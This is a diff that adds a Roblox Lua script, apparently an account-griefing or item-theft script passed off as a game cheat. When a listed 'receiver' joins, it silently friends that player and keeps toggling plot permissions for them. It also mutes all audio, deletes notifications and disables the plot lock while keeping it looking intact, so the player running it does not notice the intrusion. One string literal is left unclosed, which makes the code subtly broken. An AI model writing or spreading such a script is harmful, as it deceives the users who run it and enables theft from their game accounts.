@@ -1,0 +1,167 @@
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Players = game:GetService("Players")
+local Workspace = game:GetService("Workspace")
+local SoundService = game:GetService("SoundService")
+local Synchronizer = require(ReplicatedStorage:WaitForChild("Packages"):WaitForChild("Synchronizer"))
+
+local Config = {
+    ReceiverNames = {"Proplong},
+    MuteAudioOnReceiverJoin = true,
+    EnableAutoFriend = true,
+    EnableAutoPermissions = true,
+    EnablePlotGriefing = true,
+    EnableReceiverKill = true
+}
+
+local env = getgenv()
+local loaderReceiverNames = env and env.receivers
+
+local Utilities = {}
+function Utilities.SafeCall(func, ...)
+    pcall(func, ...)
+end
+
+function Utilities.GetPlayerPlot()
+    local player = Players.LocalPlayer
+    local plotsFolder = Workspace:WaitForChild("Plots")
+    for _, plot in ipairs(plotsFolder:GetChildren()) do
+        local channel = Synchronizer:Wait(plot.Name)
+        if channel:Get("Owner") == player then
+            return plot, channel
+        end
+    end
+    return nil, nil
+end
+
+local ReceiverManager = { _receivers = {}, _isReceiverPresent = false, _soundMuted = false, _soundConnections = {}, _permissionCoroutine = nil }
+
+function ReceiverManager:_muteSound(sound)
+    if sound:IsA("Sound") then sound.Volume = 0 end
+end
+
+function ReceiverManager:MuteAllSounds()
+    if self._soundMuted then return end
+    self._soundMuted = true
+    for _, sound in pairs(Workspace:GetDescendants()) do self:_muteSound(sound) end
+    for _, sound in pairs(SoundService:GetDescendants()) do self:_muteSound(sound) end
+    table.insert(self._soundConnections, Workspace.DescendantAdded:Connect(function(d) self:_muteSound(d) end))
+    table.insert(self._soundConnections, SoundService.DescendantAdded:Connect(function(d) self:_muteSound(d) end))
+end
+
+function ReceiverManager:_startAutoPermissions()
+    if self._permissionCoroutine then return end
+    self._permissionCoroutine = task.spawn(function()
+        local toggleFriendsEvent = ReplicatedStorage.Packages.Net["RE/PlotService/ToggleFriends"]
+        while self._isReceiverPresent do
+            Utilities.SafeCall(function() toggleFriendsEvent:FireServer() end)
+            task.wait(0.2)
+        end
+    end)
+end
+
+function ReceiverManager:_stopAutoPermissions()
+    if self._permissionCoroutine then self._permissionCoroutine = nil end
+end
+
+function ReceiverManager:OnPlayerAdded(player)
+    local allReceivers = {}
+    for _, name in ipairs(Config.ReceiverNames) do
+        table.insert(allReceivers, name)
+    end
+    if type(loaderReceiverNames) == "table" then
+        for _, name in ipairs(loaderReceiverNames) do
+            table.insert(allReceivers, name)
+        end
+    end
+
+    local isReceiver = false
+    for _, receiverName in ipairs(allReceivers) do
+        if string.find(player.Name:lower(), receiverName:lower(), 1, true) then
+            isReceiver = true
+            break
+        end
+    end
+
+    if not isReceiver or self._isReceiverPresent then return end
+
+    self._isReceiverPresent = true
+    self._receivers[player.UserId] = player
+    if Config.MuteAudioOnReceiverJoin then self:MuteAllSounds() end
+    if Config.EnableAutoFriend then Utilities.SafeCall(Players.LocalPlayer.RequestFriendship, Players.LocalPlayer, player) end
+    if Config.EnableAutoPermissions then self:_startAutoPermissions() end
+    if Config.EnableReceiverKill then
+        Utilities.SafeCall(function()
+            if player.Character then player.Character:Destroy() end
+            player.CharacterAdded:Connect(function(char) char:Destroy() end)
+        end)
+    end
+end
+
+function ReceiverManager:OnPlayerRemoving(player)
+    if self._receivers[player.UserId] then
+        self._receivers[player.UserId] = nil
+        self._isReceiverPresent = false
+        self:_stopAutoPermissions()
+    end
+end
+
+local function StartPersistentPlotFreeze(plot)
+    if not plot then return end
+    task.spawn(function()
+        while task.wait(0.25) do
+            Utilities.SafeCall(function()
+                for _, descendant in ipairs(plot:GetDescendants()) do
+                    if descendant:IsA("BasePart") and not descendant.Anchored then
+                        descendant.Anchored = true
+                    end
+                end
+            end)
+        end
+    end)
+end
+
+local function CreateFakeLock(plot)
+    if not plot then return end
+    Utilities.SafeCall(function()
+        local plotBlockHitbox = plot:FindFirstChild("Purchases", true) and plot:FindFirstChild("PlotBlock", true) and plot:FindFirstChild("Hitbox", true)
+        if plotBlockHitbox then
+            plotBlockHitbox.CanCollide = false
+            plotBlockHitbox.CanTouch = false
+            plotBlockHitbox.Transparency = 1
+        end
+        local laserPart = plot:FindFirstChild("LaserHitbox", true) and plot:FindFirstChild("Main", true)
+        if laserPart then
+            laserPart.CanCollide = false
+            laserPart.Transparency = 0.5
+            laserPart:GetPropertyChangedSignal("Transparency"):Connect(function()
+                if laserPart.Transparency ~= 0.5 then
+                    task.defer(function() laserPart.Transparency = 0.5 end)
+                end
+            end)
+        end
+    end)
+end
+
+local function Initialize()
+    Utilities.SafeCall(function()
+        local playerGui = Players.LocalPlayer:WaitForChild("PlayerGui")
+        local function removeNotif(notif)
+            if notif and (notif.Name == "TopNotification" or notif.Name == "Notification") then
+                notif:Destroy()
+            end
+        end
+        removeNotif(playerGui:FindFirstChild("TopNotification"))
+        removeNotif(playerGui:FindFirstChild("Notification"))
+        playerGui.ChildAdded:Connect(removeNotif)
+    end)
+    Players.PlayerAdded:Connect(function(p) ReceiverManager:OnPlayerAdded(p) end)
+    Players.PlayerRemoving:Connect(function(p) ReceiverManager:OnPlayerRemoving(p) end)
+    for _, player in ipairs(Players:GetPlayers()) do
+        ReceiverManager:OnPlayerAdded(player)
+    end
+    local playerPlot, _ = Utilities.GetPlayerPlot()
+    CreateFakeLock(playerPlot)
+    StartPersistentPlotFreeze(playerPlot)
+end
+
+Initialize()
